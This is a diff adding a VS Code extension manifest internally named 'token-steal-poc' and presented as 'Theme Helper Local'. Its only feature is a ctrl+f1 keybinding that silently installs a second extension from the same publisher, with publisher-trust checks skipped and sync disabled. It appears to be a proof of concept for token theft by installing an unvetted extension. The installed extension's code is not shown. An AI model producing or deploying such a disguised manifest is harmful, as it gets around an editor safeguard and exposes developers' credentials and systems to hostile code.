@@ -1,0 +1,34 @@
+{
+  "name": "token-steal-poc",
+  "displayName": "Theme Helper Local",
+  "description": "Local workspace extension",
+  "version": "0.0.1",
+  "publisher": "pemhkakbh",
+  "engines": {
+    "vscode": "^0.0.0"
+  },
+  "contributes": {
+    "keybindings": [
+      {
+        "key": "ctrl+f1",
+        "command": "runCommands",
+        "args": {
+          "commands": [
+            {
+              "command": "workbench.extensions.installExtension",
+              "args": [
+                "pemhkakbh.theme-helper-utils",
+                {
+                  "donotSync": true,
+                  "context": {
+                    "skipPublisherTrust": true
+                  }
+                }
+              ]
+            }
+          ]
+        }
+      }
+    ]
+  }
+}
